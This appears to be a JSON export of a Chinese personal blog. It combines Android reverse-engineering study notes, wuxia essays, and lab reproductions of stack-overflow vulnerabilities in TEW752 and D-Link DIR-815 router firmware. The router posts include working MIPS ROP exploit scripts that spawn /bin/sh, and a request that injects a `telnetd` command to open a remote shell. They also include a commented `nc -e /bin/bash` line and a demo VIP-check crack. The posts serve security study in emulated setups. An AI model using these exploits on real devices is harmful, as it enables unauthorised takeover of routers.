smali代码分析\rdemo的第二关\n目标是一键三连，但是提示需要获取大会员，尝试修改smali代码。\n首先使用jadx反编译然后搜索特定字符串(jadx抽风了，这里改用jeb)，定位到字符串的位置，同时可以按tab键查看对应的java代码\n实战修改\r修改判断\r理清修改的逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 00000000 iget p0, p0, Ref$IntRef-\u0026gt;element:I 00000004 const/4 p5, 1 00000006 const/16 v0, 10 0000000A if-ge p0, v0, :2A :E 0000000E move-object p0, p1 00000010 check-cast p0, Context 00000014 const-string v0, \u0026#34;请先获取10个硬币哦\u0026#34; 00000018 check-cast v0, CharSequence 0000001C invoke-static Toast-\u0026gt;makeText(Context, CharSequence, I)Toast, p0, v0, p5 00000022 move-result-object p0 00000024 invoke-virtual Toast-\u0026gt;show()V, p0 :2A 0000002A invoke-virtual ChallengeSecond-\u0026gt;isvip()Z, p1 00000030 move-result p0 00000032 if-eqz p0, :86 :36 00000036 check-cast p1, Context 0000003A const-string p0, \u0026#34;当前已经是大会员了哦！\u0026#34; 0000003E check-cast p0, CharSequence 00000042 invoke-static Toast-\u0026gt;makeText(Context, CharSequence, I)Toast, p1, p0, p5 00000048 move-result-object p0 0000004A invoke-virtual Toast-\u0026gt;show()V, p0 00000050 const p0, 0x7F0D0018 # mipmap:zan_active 00000056 invoke-virtual ImageView-\u0026gt;setImageResource(I)V, p2, p0 0000005C const p0, 0x7F0D0008 # mipmap:coin_active 00000062 invoke-virtual ImageView-\u0026gt;setImageResource(I)V, p3, p0 00000068 const p0, 0x7F0D000A # mipmap:collect_active 0000006E invoke-virtual ImageView-\u0026gt;setImageResource(I)V, p4, p0 00000074 sget-object p0, SPUtils-\u0026gt;INSTANCE:SPUtils 00000078 const/4 p2, 2 0000007A const-string p3, \u0026#34;level\u0026#34; 0000007E invoke-virtual SPUtils-\u0026gt;saveInt(Context, String, I)V, p0, p1, p3, p2 00000084 goto :A0 :86 00000086 check-cast p1, Context 0000008A const-string p0, \u0026#34;请先充值大会员哦！\u0026#34; 0000008E check-cast p0, CharSequence 00000092 invoke-static Toast-\u0026gt;makeText(Context, CharSequence, I)Toast, p1, p0, p5 00000098 move-result-object p0 0000009A invoke-virtual Toast-\u0026gt;show()V, p0 :A0 000000A0 return p5 首先第四行的判断是否有10个硬币，有则跳转:2A去判断是否是会员。:2A里的第16行判断是否是vip不是则跳转到:86。理清修改逻辑后去MT管理器里进行修改。\n第一个硬币判断由\u0026gt;=10改为\u0026lt;=10，而对于不是大会员的跳转分支直接注释。\n修改寄存器的值\r首先第一处判断，把需要的硬币数改为0，第二处把vip判断函数的返回值直接设为1。\n强制跳转\r首先第一跳转，可以直接修改goto到cond_15直接进行是否是会员的判断，而对于是否是会员判断完，添加一个goto跳转并且在是大会员的分支添加要跳转的标签。（这里也可以注释删除，但是如果代码逻辑是先判断不是大会员再else是大会员就不能这样操作）\n其他\r这次实战只是一个简单的栗子，对于这种技巧需要掌握应该需要多动手，多看smali，多改。\n参考\r吾爱教程：https://www.52pojie.cn/thread-408645-1-1.html\n​\n","date":"2024-09-14T21:39:03+08:00","permalink":"https://zhu1ang.github.io/p/52study_2/","title":"安卓逆向入门（二）"},{"content":"前言\r由于买的测试机还没有到手，所以这几天找逆向教程乱找都没合适的，今天突然发现这个吾爱破解的教程第一节竟然是模拟器环境搭建，甚是对我的需求，于是直接开干（后续真机到手也在真机上搞搞）\napk双开\r操作：修改包名\n原理：让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP 操作：修改Framework\n原理：对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开 操作：通过虚拟化技术实现\n原理：虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间 操作：以插件机制运行\n原理：利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp 身为xdx，带佬只教第一种，那么先操作第一种\n使用NP管理器的APK共存功能（MT会员功能），修改不同的包名然后直接安装即可得到两个52pj的demo，如果存在签名校验则会有安装闪退等崩溃情况出现。\n汉化\r首先，在res/资源目录下使用MT管理器搜素Hello这个字符串，然后进行修改，并且更新，重新安装\n而对于下面的英文和未知文字则可以使用开发者助手提取页面资源进行搜索匹配。\n初识AndroidManifest.xml\r小测试\r替换demo第一关的图片\n根据对apk结构的一个初步认识。图片等资源应该是在res/目录下，进去寻找找到图片之后，直接替换掉。\n参考\r吾爱教程：https://www.52pojie.cn/thread-408645-1-1.html\n","date":"2024-09-13T18:42:43+08:00","permalink":"https://zhu1ang.github.io/p/52study/","title":"安卓逆向入门（一）"},{"content":"系统架构\r​\tAndroid是一个基于Linux的操作系统。从底层开始，依次是Linux内核层、HAL硬件抽象层（不重要）、运行库、应用框架（App Framework）、应用程序。\nLinux内核层\r​\tAndroid使用的是Linux的内核，所以Android和Linux在底层本质是一样的，提供操作系统的核心功能。\n系统运行库层\r​\t由两部分构成，一部分是C/C++编写的原生库文件，可以通过API被应用直接调用，例如：libopengl.so、libsqlite3.so。第二部分是安卓运行时库，是Android应用程序执行时的环境，在Android5.0之前使用Dalvik VM（libdvm.so）作为运行环境，之后是Art（libart.so）。\n应用框架层\r​\t提供API用于构建Android应用，可以看作是应用程序和运行库的一个接口。无论APP加壳与否，其框架层的代码在应用层加载之前就存在。\n安卓加壳了解\r​\t加壳是指对Android应用的APK文件进行额外的包装，类似于在应用的外面加了一层壳，通过这一层壳可以隐藏或保护应用的实际内容。被加壳的APK文件在启动时会先执行壳中的代码，壳的代码负责解密或加载被保护的真实应用。\n​\t加壳技术的迭代过程：\n代码混淆，将应用的类名、方法名、变量名等转换为毫无意义的字符，增加静态分析的难度 动态dex，Dex文件是Android应用中包含字节码的核心文件。加壳时，开发者会将Dex文件进行加密，只有在运行时壳程序才会解密这些Dex文件，并将其加载到内存中执行。常见的加密方式包括AES、DES等对称加密算法。 动态dex+函数抽取，得到dex反汇编查看仍然会有部分函数的内容是隐藏的。 VMP保护，将部分应用逻辑放到一个自定义的虚拟机中执行，增强对应用核心逻辑的保护。 dex2c，将java代码进行词法句法分析，生成对应的C/C++文件，然后交叉编译成so动态库 应用层\r​\t即App层，包括系统应用和自己安装的普通应用。也就是日的对象。\nAndroid四大组件\r​\tActivity（活动）、Service（服务）、Broadcast Receiver（广播接收器） 和 Content Provider（内容提供者）。\n​\tActivity 是 Android 应用中用于构建用户界面的组件。每个 Activity 都表示应用的一个可视化界面，负责与用户的交互。\n​\tService 是 Android 中的后台组件，用于执行长时间运行的操作，不需要与用户进行交互。Service 一般用于处理一些不需要用户界面但又需要长期存在的操作，如播放音乐、下载文件等。\n​\tBroadcast Receiver用于响应 来自其他应用程序或者系统的广播消息。\n​\tContent Provider 是 Android 用来实现应用间数据共享的组件，也是 Android 中处理数据共享的唯一标准方式。\n","date":"2024-09-10T10:58:46+08:00","permalink":"https://zhu1ang.github.io/p/240910/","title":"安卓逆向学习笔记（一）"},{"content":"金梁古温侠风草叙\r楔子 抚剑而拜\r​\t我大概是十三四岁的年纪开始读的武侠小说。\n​\t某个记不起日期记不起时辰的一天，我正在摆弄着我的“学习机”——形状类似笔记本电脑但是不能连接互联网，只能用来观看教学视频、做一些练习题、读一些教材解析等等。许是命定，我偶然发现竟然有许多书可以阅读，彼时正年少的自己选择了一本《多情剑客无情剑》来读，其时尚不知古龙为何人，只觉得作者和著作的名字都很吸引刚刚青春期的我。读完第一章我便被这本小说的人物故事所深深吸引，当然最最吸引我的就是古龙那打破传统武侠的写作手法，对交手两人的武功招式没有过多的描写，但是能给人极强的画面感，简洁而凌厉，彷佛感受得到透纸而出的杀气。\n​\t从那以后，读武侠小说就成为了我消遣的主要方式。不一开始读的就是古龙的成名作导致后来再去读他早期传统武侠风格作品的时候，颇有些不习惯。好再后来发现学习机的小说里竟然有金庸的作品，当时亦是不知金庸何人，但是读了几本武侠小说的我一眼便能看出来《笑傲江湖》、《书剑恩仇录》、《天龙八部》这些书名一定都是武侠小说。\n​\t如果说古龙的小说吸引我开说读武侠小说，那么金庸的作品则是让我对武侠小说真正深读下去。金庸的作品风格不同于古龙的凌厉、洒脱，相反是一种稳重、敦笃的风格。两人的作品我花了初中三年和高中两年读了个八九分，除了学习机上没有的全部读完了。\n​\t少年读武侠，无疑令人神往快意恩仇的江湖，何况自己颇为内向，也就会更频繁地在心里代入小说里的人物。身不在江湖而心在江湖，手中无剑而心中有剑。抚心拜剑，年少如此，也不枉羡风流。\n正文\r未完待续。。。\r​\n","date":"2024-09-08T22:14:29+08:00","permalink":"https://zhu1ang.github.io/p/%E5%89%91%E4%B8%8E%E8%8A%B1%E9%85%92%E4%B8%8E%E8%A1%80/","title":"剑与花、酒与血"},{"content":"前期准备\r固件下载链接：TEW752\n静态分析\r根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析\n函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。\n但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现\n同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件\n分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：\n并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据：\n考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。\n模拟路由器环境\n构造HTTP请求（溢出HTTP_SID/SERVICE）\nTCP scoket来发送请求\n路由器模拟\r使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。\n动态调试\r1 测偏移\r先用cyclic 2000 \u0026gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式\n1 2 3 4 5 #!/bin/bash service=\u0026#34;?service=`cat test`\u0026#34; qemu-mipsel-static -L ./ -g 1234 -0 \u0026#34;gena.cgi\u0026#34; -E REQUEST_METHOD=\u0026#34;UNSUBSCRIBE\u0026#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=\u0026#34;192.168.182.14\u0026#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474\n2 找基址\r由于使用vmmap命令无法得到libc的基址\n所以，这里仍然根据延迟绑定机制来计算libc的基址\n0x3ff8a060 - 0x52060 = 0x3ff38000\n所以vmmap查看得到的，\u0026lt; explored \u0026gt;文件就是libc的基址\n3 找gadget\r考虑利用system函数来得到shell\n1 mipsrop.stackfinder() 选择0x16824处的gadget\n$sp + 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放cmd\n跳转$s0。\n仍然需要防止坏字符00，所以找对$s0操作的gadget\n观察溢出函数处\n1 mipsrop.find(\u0026#34;addiu $s0\u0026#34;) $s1放上一个gadget\n$0 放system地址\n$ra 返回地址放第二个gadget\n本地利用\r根据测得的偏移和找到的基址以及gadget，编写exp如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # python3 from pwn import * context.endian = \u0026#34;little\u0026#34; context.arch = \u0026#34;mips\u0026#34; base_addr = 0x3ff38000 system_addr_1 = 0x53200-1 gadget1 = 0x16824 gadget2 = 0x32a98 padding = b\u0026#39;A\u0026#39; * 0x1ce padding += p32(base_addr + system_addr_1) # s0 padding += p32(base_addr + gadget1 ) # s1 padding +=b\u0026#39;a\u0026#39;*4 # s2 padding += p32(base_addr + gadget2) # ra padding += b\u0026#39;B\u0026#39; * 0x10 padding += b\u0026#39;/bin//sh\u0026#39; f = open(\u0026#34;exploit\u0026#34;,\u0026#39;wb+\u0026#39;) f.write(padding) f.close() 用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell\n模拟环境利用\r首先使用固件模拟工具FirmAE进行固件的模拟\n然后直接运行以下exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import socket import os from time import sleep server = \u0026#39;192.168.10.1\u0026#39; port = 49152 shell = \u0026#39;`telnetd -p 8888 \u0026amp;`\u0026#39; con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) request = \u0026#34;SUBSCRIBE /gena.cgi?service=\u0026#34; + str(shell) + \u0026#34; HTTP/1.0\\n\u0026#34; request += \u0026#34;Host: \u0026#34; + str(server) + str(port) + \u0026#34;\\n\u0026#34; request += \u0026#34;Callback: \u0026lt;http://192.168.0.4:34033/ServiceProxy27\u0026gt;\\n\u0026#34; request += \u0026#34;NT: upnp:event\\n\u0026#34; request += \u0026#34;Timeout: Second-1800\\n\u0026#34; request += \u0026#34;Accept-Encoding: gzip, deflate\\n\u0026#34; request += \u0026#34;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n\u0026#34; sleep(1) con.connect((socket.gethostbyname(server),port)) con.send(request.encode()) results = con.recv(4096) sleep(3) print(\u0026#34;sucess\u0026#34;) os.system(\u0026#39;telnet \u0026#39; + str(server) + \u0026#39; 8888\u0026#39;) 可以成功获得shell\n","date":"2024-09-04T16:42:46+08:00","permalink":"https://zhu1ang.github.io/p/tew752/","title":"TEW752"},{"content":"​ 初，余年十三学于鲁南。其地僻物薄，学子之数不可数也，诸君皆寒窗熬烛无敢懈者。彼时诸学子岁未及束发而负千钧之重，日日惶恐，时时叹息，唯恐力不尽心而有所辜负万一。又，余家贫无可供玩乐消遣者，困顿之意无从消处，唯武侠小说数本可略自娱。\n​ 当是时，偶读《多情剑客无情剑》便深叹服，迷恋不能自已，从此真如“一入江湖深似海”。三年之间，古龙先生数十作品皆一一拜读，然意犹未尽，故又日夜捧读金庸先生之作，更是别有一番滋味。江湖豪情，儿女情长，甚合余少年心境，每每念及，必心驰神往。\n​ 而后，三年之期以备高考之事至。平素课业压力之大，犹如枯木支撑泰山、土堤拦断江河，倾塌崩溃只在一瞬之间。其压迫之感，呼吸尚不能遑论自娱哉？于是诸侠义小说皆不得已搁置，恍恍惚三年，身处其中不觉岁月之快只觉年岁之苦，霎时间三年往事烟消云散方如梦初醒，故人离别、旧事尘封，再回首已是物是人非。\n​ 又数年，余历经人生之起落，就中苦乐曲折实非片语只字可叙一二，唯叹情之一事，无可奈何。当时心境无一丝少年侠气，是为飘渺虚妄年岁，思量到处，不敢回首，不甘回首。\n​ 而今忽有一剧名为《金庸武侠世界》，略观之，少年旧事忽如春风过水，万层涟漪攒入心头，于是重拾武侠小说，再品江湖风流。\n","date":"2024-09-04T16:41:33+08:00","permalink":"https://zhu1ang.github.io/p/%E6%B1%9F%E6%B9%96%E6%9D%82%E8%B0%88/","title":"江湖杂谈"},{"content":"1 环境准备\r固件下载链接：DLink下载\n物理机：Ubuntu 20.04 （需安装binwalk、qemu、pwntools等）\n反汇编共工具：IDA Pro\n2 静态分析\r根据已有的资料，DIR-815多重栈溢出漏洞和前端的超长cookie有关，并且漏洞文件为 hedweb.cgi\n首先对固件进行解包\n1 binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi\n是/htdocs/cgibin的软链接，因此，使用IDA逆向分析cgibin\n在main函数中可以看到，此处为hedwigcgi_main函数分支\n另外根据cgi-bin的架构和常用的变量，若要操作cookie，需使用getenv(\u0026quot;HTTP_COOKIE\u0026quot;)\n直接搜索\u0026quot;HTTP_COOKIE\u0026quot;字符串，根据交叉引用，只有sess_get_uid这个函数使用了这 个字符串\n继续通过交叉引用回溯，发现在hedwigcgi_main调用了这个函数\n并且两次调用了sprintf这个危险函数，两次拼接使用的字符串都是sess_get_uid处理之后的v4，分析sess_get_uid函数可知，v4是COOKIE中的uid的值。\n如果能走到第二个sprintf函数，则会覆盖上一次拼接的内容，则第二处sprintf是溢出点\n两个判断需要满足的条件为：存在/var/tmp 目录以及环境变量REQUEST_URI不为空。\n由于固件解包后不存在/var/tmp目录，故需要自己创建，否则后续测试偏移时由于无法走到第二个sprintf函数会出错。\n3 动态调试\r3.1 qemu用户模式复现\r1 2 3 4 5 6 7 8 9 #!/bin/sh INPUT=\u0026#34;uid=1234\u0026#34; TEST=\u0026#34;uid=1234`cat payload`\u0026#34; LEN=$(echo -n \u0026#34;INPUT\u0026#34; |wc -c) PORT=\u0026#34;1234\u0026#34; cd ./squashfs-root cp $(which qemu-mipsel-static) ./qemu echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; -E REQUEST_METHOD=\u0026#34;POST\u0026#34; -E HTTP_COOKIE=$TEST -E REQUEST_URI=\u0026#34;/hedwig.cgi\u0026#34; -g $PORT /htdocs/web/hedwig.cgi rm -f ./qemu 用以上脚本启动qemu模拟CGI程序，其中\ncyclic 2000生成2000字符作为payload -E 选项添加环境变量即HTTP_COOKIE等 使用以下命令启动\n1 2 3 4 sudo ./local.sh #启动调试脚本 gdb-multiarch ./squashfs-root/htdocs/cgibin #多架构gdb调试 target remote 127.0.0.1:1234 b *ret_addr #在hedwigcgi_main函数返回处下断点 可以看到返回地址$ra已经被覆盖了\n测得偏移为1009\n接下来就是获取基地址：\nvmmap命令查看，很大概率会因为gdb版本问题导致命令执行无效 libc函数地址 - 偏移 = 基地址，延迟绑定特性、write、puts泄露等 读取程序的 /proc/self/maps来获取与程序相关的基地址 第一个LOAD段中包含了共享库的代码段，其权限为r-xp，因此可以使用 ret2call，去调用system函数因此需要获取基地址\n通过延迟绑定机制计算基地址：\n基地址 = 0x7f76ca20 - 0x34a20 = 0x7f738000\n接下来的工作就是构造ROP链\n一般的x86的栈溢出可以直接覆盖返回地址与参数，但是MIPS的前四个参数是通过寄存器传递的，故不能直接覆盖栈来实现诸如system('cmd')的执行。\nMIPS架构栈溢出特性：\n1分支延迟，例如跳转指令在跳转地址填充后，跳转之前，会先执行跳转指令的下一条指令 2缓存不一致，指令缓存区（Instruction Cache）和数据缓存区（Data Cache）两者的同步需要时间，即栈上写入的指令并不是立即可以执行的 注意：system的地址为0x0053200，结尾是\u0026rsquo;x00/\u0026rsquo;，在sprintf函数拼接payload过程中会被截断，故此处考虑写入 system_addr - 1，再使用addiu \u0026hellip; , 1 的gadget还原后再跳转\n通过IDA的mipsrop插件执行mipsrop.stackfinder(),找到0x159cc的gadget，这个gadget的作用是跳转$s0，并把$s5的值赋给$a0，也就是第一个参数寄存器。\n通过mipsrop.find(\u0026quot;addiu $s0 , 1\u0026quot;)找到第二个还原system_addr的gadget\n根据函数结束处的栈布局以及两个gadget进行ROP链的组装，得到exp如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * context.arch = \u0026#39;mips\u0026#39; context.endian = \u0026#39;little\u0026#39; libc_base = 0x7F738000 system_offset = 0x53200-1 gadget1 = 0x159cc gadget2 = 0x158C8 #cmd = b\u0026#34;nc -e /bin/bash 9999\u0026#34; cmd = b\u0026#34;/bin/sh\u0026#34; data = b\u0026#34;a\u0026#34;*(1009 - 36) data += p32(libc_base+system_offset) #s0 data += b\u0026#34;bbbb\u0026#34; #s1 data += b\u0026#34;cccc\u0026#34; #s2 data += b\u0026#34;dddd\u0026#34; #s3 data += b\u0026#34;eeee\u0026#34; #s4 data += p32(libc_base+gadget1) #s5 # addiu $s5, $sp, 0x10 # move $a1, $s3 # move $a2, $s1 # move $t9, $s0 # jalr $t9 # move $a0, $s5 data += b\u0026#34;ffff\u0026#34; #s6 data += b\u0026#34;gggg\u0026#34; #s7 data += b\u0026#34;aaaa\u0026#34; #fp data += p32(libc_base+gadget2) #ra # move $t9, $s5 # jalr $t9 # addiu $s0, 1 data += b\u0026#34;b\u0026#34;*0x10 data += cmd f=open(\u0026#34;payload\u0026#34;,\u0026#34;wb\u0026#34;) f.write(data) f.close() 调试过程可以看出ROP链的构造没有问题，但是用户模式却无法打通，参考网上博客是这里system函数中有调用fork()函数，而用户模式是不支持多线程的，这里fork()的失败，会导致后面$fp是个空指针，就会出错。\n故此处应使用ROP+shellcode方法\nexp：\n3.2 qemu系统模式复现\r用户模式（User Mode）： 用户模式通常指的是在操作系统的用户空间下运行的程序或进程。在这种模式下，QEMU 可以模拟一个用户级别的环境，但不会涉及到底层的硬件操作或系统调用。 在用户模式下，程序的运行受到操作系统的隔离和限制，无法直接访问硬件设备或执行系统级操作。 系统模式（System Mode）： 系统模式，也称为\u0026quot;全系统仿真\u0026quot;（Full System Emulation），指的是 QEMU 模拟整个计算机系统，包括 CPU、内存、硬盘、网络设备等硬件组件。 在这种模式下，QEMU 可以运行完整的操作系统镜像，允许用户像在真实硬件上一样启动和使用操作系统。 系统模式提供了更接近真实环境的测试和开发平台，适用于操作系统开发、硬件兼容性测试、安全研究等场景。 两者的主要区别在于仿真的范围和深度：\n用户模式更侧重于应用程序层面的仿真，适用于开发和测试应用程序。 系统模式提供了更全面的仿真环境，包括硬件和操作系统层面，适用于底层开发和系统级测试。 3.2.1 配置qemu网络设置\r首先需要下载qemu虚拟机镜像文件：[qemu mips](Index of /~aurel32/qemu (debian.org))\n然后使用启动脚本启动qemu虚拟机，并配置网络\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #! /bin/sh echo \u0026#34;config net\u0026#34; # 1 # 这两句不能断开 brctl addbr br0 #ifconfig br0 up # or ip link set br0 up # 2 brctl addif br0 ens33 #ifconfig ens33 0.0.0.0 # or ip addr add 0.0.0.0 dev ens33 # 3 dhclient br0 # 4 tunctl -t tap0 -u `whoami` #ifconfig tap0 up # or ip link set tap0 up brctl addif br0 tap0 # 5 echo \u0026#34;qemu start \u0026#34; sudo qemu-system-mipsel -M malta -kernel ./vmlinux-3.2.0-4-4kc-malta -hda ./debian_squeeze_mipsel_standard.qcow2 -append \u0026#34;root=/dev/sda1 console=tty0\u0026#34; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic 等待启动完成，qemu的默认登录为：root/root，登录后使用ifconfig查看网卡信息——如果此时eth0网卡存在但没有IP，可以使用ifconfig eth0 ip/24 up手动分配ip，注意要和宿主机在同一网卡下。\n互相测试能否ping通\n3.2.2 上传固件\r需要在qemu虚拟机使用chroot切换根目录，并执行shell，因此需要将物理机中解压出来的文件系统上传到qemu虚拟机中。\n1 scp -r squashfs-root/ root@qemu_IP:/path/ 3.2.3开启httpd服务\r在qemu虚拟机的squashfs-root目录下新建一个http_conf配置文件，里面写入（注意修改49行的ip）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Umask 026 PIDFile /var/run/httpd.pid LogGMT On #开启log ErrorLog /log #log文件 Tuning { NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60 } Control { Types { text/html { html htm } text/xml { xml } text/plain { txt } image/gif { gif } image/jpeg { jpg } text/css { css } application/octet-stream { * } } Specials { Dump { /dump } CGI { cgi } Imagemap { map } Redirect { url } } External { /usr/sbin/phpcgi { php } } } Server { ServerName \u0026#34;Linux, HTTP/1.1, \u0026#34; ServerId \u0026#34;1234\u0026#34; Family inet Interface eth0 #对应qemu仿真路由器系统的网卡 Address 192.168.182.6 #qemu仿真路由器系统的IP Port \u0026#34;1234\u0026#34; #对应未被使用的端口 Virtual { AnyHost Control { Alias / Location /htdocs/web IndexNames { index.php } External { /usr/sbin/phpcgi { router_info.xml } /usr/sbin/phpcgi { post_login.xml } } } Control { Alias /HNAP1 Location /htdocs/HNAP1 External { /usr/sbin/hnap { hnap } } IndexNames { index.hnap } } } } 3.2.4开启物理机转发功能\r在宿主机中新建以下net_conf_host.sh脚本并执行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #! /bin/sh sudo sysctl -w net.ipv4.ip_forward=1 sudo iptables -F sudo iptables -X sudo iptables -t nat -F sudo iptables -t nat -X sudo iptables -t mangle -F sudo iptables -t mangle -X sudo iptables -P INPUT ACCEPT sudo iptables -P FORWARD ACCEPT sudo iptables -P OUTPUT ACCEPT sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT 之后，再在qemu虚拟机的squashfs-root目录下创建init.sh的脚本进行初始化操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/bin/bash echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space cp http_conf / cp sbin/httpd / cp -rf htdocs/ / mkdir /etc_bak cp -r /etc /etc_bak rm /etc/services cp -rf etc/ / cp lib/ld-uClibc-0.9.30.1.so /lib/ cp lib/libcrypt-0.9.30.1.so /lib/ cp lib/libc.so.0 /lib/ cp lib/libgcc_s.so.1 /lib/ cp lib/ld-uClibc.so.0 /lib/ cp lib/libcrypt.so.0 /lib/ cp lib/libgcc_s.so /lib/ cp lib/libuClibc-0.9.30.1.so /lib/ cd / rm -rf /htdocs/web/hedwig.cgi rm -rf /usr/sbin/phpcgi rm -rf /usr/sbin/hnap ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi ln -s /htdocs/cgibin /usr/sbin/phpcgi ln -s /htdocs/cgibin /usr/sbin/hnap ./httpd -f http_conf 通过以下命令切换根目录\n1 2 3 mount -o bind /dev ./squashfs-root/dev/ mount -t proc /proc/ ./squashfs-root/proc/ chroot squashfs-root bash 但是squashfs-root目录下并无bash，静态编译一个mips架构的bash放进去。\n如果报错没有PID文件，自己手动创建一个文件，只要PID不和已有的重复就行。\n最后，启动init.sh脚本，开启httpd服务\n此时在物理机中访问 qemu_IP/hedwig.cgi，如图：\n出现上图，则说明配置成功。最后，退出qemu虚拟机的时候，运行fin.sh的脚本恢复/etc文件夹,否则后续qemu会打不开：\n1 2 3 4 #!/bin/bash rm -rf /etc mv /etc_bak/etc /etc rm -rf /etc_bak 3.2.5 复现\r​ 在物理机上运行exp.py，将静态编译的gdbserver、生成的payload上传到qemu虚拟机中。\n注：系统模式和用户模式的基址可能是不同的\n执行以下脚本启动gdbserver调试\n1 2 3 4 5 6 7 8 9 10 11 export CONTENT_LENGTH=\u0026#34;100\u0026#34; export CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; export HTTP_COOKIE=\u0026#34;uid=`cat payload`\u0026#34; export REQUEST_METHOD=\u0026#34;POST\u0026#34; export REQUEST_URI=\u0026#34;/hedwig.cgi\u0026#34; echo \u0026#34;uid=1234\u0026#34;|./gdbserver.mipsle 192.168.182.12:6666 /htdocs/web/hedwig.cgi #unset CONTENT_LENGTH #unset CONTENT_TYPE #unset HTTP_COOKIE #unset REQUEST_METHOD #unset REQUEST_URI 直接在虚拟机里启动该脚本，物理机启动一个端口监听，gdb连接上直接c即可获得shell\n附录\r参考文献\rhttps://bbs.kanxue.com/thread-272318.htm#msg_header_h3_8\nhttps://bbs.kanxue.com/thread-263758.htm\n","date":"2024-09-04T16:37:49+08:00","permalink":"https://zhu1ang.github.io/p/dir815/","title":"DIR815漏洞复现"},{"content":"​\t农历甲辰龙年七月初七，七夕，是为神仙眷侣期年相会之日，故民俗或借之以思旧、或以慕新。 余孑然一身，假期方尽，匆匆南下赴金陵求学。路途旅人数千，形形色色，皆疲于车马风尘，无暇他顾。 ​\t佳节美好良缘在众生亦不在众生。余与世间众旅人碍于路途遥遥心中烦闷，而无二意，是为不在众生。然，路远而终有尽头，彼时胡不可斟酒疏解心事、思恋佳人哉？或有人共度七夕者，则更效神仙事也。此是为在众生也。 ​\t凡世不仁亦当如此心境，可凌困苦而观前路光明者，方能不困于心不固于情。 